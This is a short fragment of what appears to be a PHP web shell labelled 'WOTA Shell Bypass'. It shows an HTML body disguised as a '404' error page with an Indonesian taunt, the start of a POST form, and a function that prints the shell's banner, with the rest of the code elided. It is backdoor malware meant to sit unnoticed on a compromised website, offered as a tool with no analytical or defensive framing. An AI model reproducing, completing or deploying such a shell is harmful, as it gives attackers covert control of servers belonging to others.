...
<body>
  <br></br>
  <center><h1>WHO AM I ? 404</h1></center>
  <center><h4>Yang Benar Aja Rugi Dong</h4></center>
</body>
<form method="post">
...
function author() {
	echo "<center><br>WOTA Shell Bypass</center>";
	exit();
}
